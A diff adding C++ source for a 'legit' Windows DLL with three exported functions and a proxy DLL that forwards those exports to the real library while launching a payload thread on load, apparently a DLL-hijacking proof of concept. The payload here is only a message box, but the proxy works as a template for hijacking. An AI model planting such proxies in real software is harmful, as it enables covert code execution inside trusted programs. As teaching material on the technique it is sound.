@@ -1,0 +1,111 @@
+#include "pch.h"
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+        break;
+    }
+    return TRUE;
+}
+
+extern "C" __declspec(dllexport) VOID exportedFunction1(int a)
+{
+    MessageBoxA(NULL, "Hi from legit exportedFunction1", "Hi from legit exportedFunction1", 0);
+}
+
+extern "C" __declspec(dllexport) VOID exportedFunction2(int a)
+{
+    MessageBoxA(NULL, "Hi from legit exportedFunction2", "Hi from legit exportedFunction2", 0);
+}
+
+extern "C" __declspec(dllexport) VOID exportedFunction3(int a)
+{
+    MessageBoxA(NULL, "Hi from legit exportedFunction3", "Hi from legit exportedFunction3", 0);
+}
+
+
+
+...........
+
+
+
+Proxy Code
+
+
+#include <windows.h>
+#include <stdio.h>
+
+typedef void (*FuncType)(int);
+
+// Declare function pointers for the exports
+FuncType real_exportedFunction1 = nullptr;
+FuncType real_exportedFunction2 = nullptr;
+FuncType real_exportedFunction3 = nullptr;
+
+HMODULE hRealDll = nullptr;
+
+// Safely run any payload here
+DWORD WINAPI RunPayload(LPVOID)
+{
+    MessageBoxA(NULL, "Hi from malicious DLL!", "Payload Executed", MB_OK);
+    return 0;
+}
+
+// Load the real DLL and assign real function pointers
+void LoadRealDLL()
+{
+    if (hRealDll) return;
+
+    // Adjust path to wherever your legit DLL is stored
+    hRealDll = LoadLibraryA("C:\\legitpath\\legit1.dll");
+    if (!hRealDll) {
+        MessageBoxA(NULL, "Failed to load legit DLL", "Error", MB_ICONERROR);
+        return;
+    }
+
+    real_exportedFunction1 = (FuncType)GetProcAddress(hRealDll, "exportedFunction1");
+    real_exportedFunction2 = (FuncType)GetProcAddress(hRealDll, "exportedFunction2");
+    real_exportedFunction3 = (FuncType)GetProcAddress(hRealDll, "exportedFunction3");
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule,
+                      DWORD  ul_reason_for_call,
+                      LPVOID lpReserved)
+{
+    switch (ul_reason_for_call)
+    {
+    case DLL_PROCESS_ATTACH:
+        LoadRealDLL();
+        CreateThread(NULL, 0, RunPayload, NULL, 0, NULL);
+        break;
+    }
+    return TRUE;
+}
+
+// Exported functions forwarded manually
+
+extern "C" __declspec(dllexport) void exportedFunction1(int a)
+{
+    if (real_exportedFunction1)
+        real_exportedFunction1(a);
+}
+
+extern "C" __declspec(dllexport) void exportedFunction2(int a)
+{
+    if (real_exportedFunction2)
+        real_exportedFunction2(a);
+}
+
+extern "C" __declspec(dllexport) void exportedFunction3(int a)
+{
+    if (real_exportedFunction3)
+        real_exportedFunction3(a);
+}
